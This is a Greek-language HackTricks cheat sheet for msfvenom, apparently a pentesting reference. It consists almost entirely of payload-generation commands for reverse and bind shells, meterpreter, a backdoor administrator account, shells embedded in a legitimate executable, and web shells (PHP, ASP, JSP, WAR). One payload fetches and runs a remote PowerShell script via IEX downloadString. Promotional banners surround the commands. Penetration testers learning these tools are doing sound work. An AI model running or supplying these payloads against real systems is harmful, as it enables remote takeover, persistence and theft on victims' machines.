# MSFVenom - Φύλλο απατεώνα

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Εγγραφείτε στον διακομιστή [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Χάκινγκ**\
Ασχοληθείτε με περιεχόμενο που εξερευνά τον ενθουσιασμό και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενημερωμένοι με τις νεότερες ανταμοιβές ευρημάτων που ξεκινούν και τις κρίσιμες ενημερώσεις των πλατφορμών

**Εγγραφείτε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **και αρχίστε να συνεργάζεστε με τους κορυφαίους χάκερ σήμερα!**

***

## Βασική msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Μπορείτε επίσης να χρησιμοποιήσετε το `-a` για να καθορίσετε την αρχιτεκτονική ή την `--platform`
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## Κοινοί παράμετροι κατά τη δημιουργία ενός shellcode

When creating a shellcode, there are several common parameters that can be used to customize its behavior. These parameters include:

- **LHOST**: Η διεύθυνση IP του επιτιθέμενου συστήματος, στο οποίο θα σταλεί ο shellcode.
- **LPORT**: Ο αριθμός θύρας στον οποίο θα ακούει ο shellcode για συνδέσεις.
- **EXITFUNC**: Η μέθοδος που θα χρησιμοποιηθεί για την έξοδο από το πρόγραμμα μετά την εκτέλεση του shellcode.
- **Encoder**: Ο κωδικοποτητής που θα χρησιμοποιηθεί για την απόκρυψη του shellcode.
- **Badchars**: Οι χαρακτήρες που πρέπει να αποφευχθούν στο shellcode, εάν υπάρχουν.
- **Platform**: Η πλατφόρμα στην οποία θα εκτελεστεί το shellcode (π.χ. Windows, Linux, macOS).
- **Arch**: Η αρχιτεκτονική του συστήματος στο οποίο θα εκτελεστεί το shellcode (π.χ. x86, x64, ARM).

Αυτές οι παράμετροι μπορούν να προσαρμοστούν ανάλογα με τις ανάγκες της επίθεσης και το περιβάλλον στο οποίο θα εκτελεστεί το shellcode.
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
## **Windows**

### **Αντίστροφο Shell**

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Συνδεδεμένη θύρα (Bind Shell)

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
{% code overflow="wrap" %}

### Δημιουργία Χρήστη

{% code %}
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
{% code overflow="wrap" %}

### CMD Shell

{% code %}
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
{% code overflow="wrap" %}

### **Εκτέλεση Εντολής**

{% endcode %}
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
{% endcode %}

### Κωδικοποιητής

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
{% endcode %}

### Ενσωματωμένο μέσα σε εκτελέσιμο

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
{% endcode %}

## Πληρωμές Linux

### Αντίστροφο κέλυφος

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Συνδεδεμένη θύρα (Bind Shell)

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
{% endcode %}

### SunOS (Solaris)

{% code overflow="wrap" %}
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
{% endcode %}

## **MAC Παραμέτροι**

### **Αντίστροφο Shell:**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Συνδεδεμένη θύρα**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
{% endcode %}

## **Πλατφόρμες βασισμένες στον ιστό**

### **PHP**

#### Αντίστροφη κέλυφος

{% code overflow="wrap" %}
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
{% endcode %}

### ASP/x

#### Αντίστροφο κέλυφος

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
{% endcode %}

### JSP

#### Αντίστροφο κέλυφος

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
{% endcode %}

### WAR

#### Αντίστροφος Shell

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
{% code %}

### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Φορτία γλωσσών σεναρίου**

### **Perl**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
{% code overflow="wrap" %}

### **Python**

{% endcode %}
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
{% endcode %}

### **Bash**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον διακομιστή [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Hacking**\
Ασχοληθείτε με περιεχόμενο που εξερευνά τον ενθουσιασμό και τις προκλήσεις του χάκινγκ.

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο.

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενημερωμένοι με τις νεότερες ευκαιρίες ευρήματος ασφαλείας και τις κρίσιμες ενημερώσεις των πλατφορμών.

**Συμμετέχετε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **και αρχίστε να συνεργάζεστε με τους κορυφαίους χάκερ σήμερα!**

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετέχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) **και** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **αποθετήρια του github.**

</details>
